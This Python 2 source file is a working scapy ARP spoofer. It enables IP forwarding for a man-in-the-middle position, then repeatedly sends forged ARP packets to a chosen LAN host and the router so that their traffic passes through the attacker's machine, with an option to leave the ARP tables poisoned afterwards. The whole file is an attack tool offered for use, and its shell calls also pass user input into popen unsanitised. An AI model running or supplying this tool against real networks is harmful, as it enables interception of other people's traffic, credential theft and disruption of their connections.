#!/usr/bin/env python
#
# arpspoof.py - simple effective scapy ARP spoofer
#  thed4rkcat@yandex.com
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 2 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from netifaces import gateways, AF_INET, AF_LINK, ifaddresses
from scapy.all import *
from time import sleep
from os import popen
from argparse import ArgumentParser

def fgetmac(ip):
	popen('ping %s -c 2 -i 0.5' % ip).read()
	return popen("arp -a | grep '%s' | cut -d 't' -f 2 | cut -d ' ' -f 2" %(ip)).read().strip()

def fownmac():
	def_gw_device = gateways()['default'][AF_INET][1]
	return ifaddresses(def_gw_device)[AF_LINK][0]['addr']

def ffix():
	resettarget=ARP(op=1,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=routermac)
	resetrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=targetmac)
	send(resetrouter, count=4, verbose=False)
	send(resettarget, count=4, verbose=False)
	if not args.mac:
		popen("echo 0 > /proc/sys/net/ipv4/ip_forward").read()

parser = ArgumentParser(prog='arpspoof', usage='./arpspoof.py [options]')
parser.add_argument('-t', "--targetip", type=str, help='Last digit of IP eg. 213')
parser.add_argument('-m', "--mac", type=str, help='Spoof to user defined MAC.')
parser.add_argument('-r', "--replies", action="store_true", help='Use ARP replies instead of requests.')
parser.add_argument('-n', "--norouter", action="store_true", help='Only poison the target, not the router.')
parser.add_argument('-f', "--nofix", action="store_true", help="Don't fix ARP tables after poison.")
args = parser.parse_args()
ismitm = ''

if args.mac:
	spoofmac = args.mac
else:
	spoofmac = fownmac()
	popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read()
	ismitm = ' (MiTM)'

routerip = gateways()['default'].values()[0][0]
network = '.'.join(routerip.split('.')[:3])

try:
	targetip = network + '.' + args.targetip
except:
	parser.print_help()
	exit()

routermac = fgetmac(routerip)
print " [*] Detected router: %s (%s)" % (routerip, routermac)
targetmac = fgetmac(targetip)
print " [*] Detected target: %s (%s)" % (targetip, targetmac)

if args.replies:
	targetop = 2
	print " [*] Using ARP replies."
else:
	targetop = 1
	print " [*] Using ARP requests."

poisontarget=ARP(op=targetop,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=spoofmac)
poisonrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=spoofmac)

print " [*] Spoofing to: %s%s" % (spoofmac, ismitm)
print " [*] Attacking."

try:
	while True:
		if args.norouter:
			send(poisontarget, verbose=False)
		else:
			send(poisonrouter, verbose=False)
			send(poisontarget, verbose=False)

		sleep(1.5)

except:
	print
	if args.nofix:
		print ' [*] Leaving ARP tables poisoned..'
	else:
		print ' [*] Fixing ARP tables..'
		ffix()
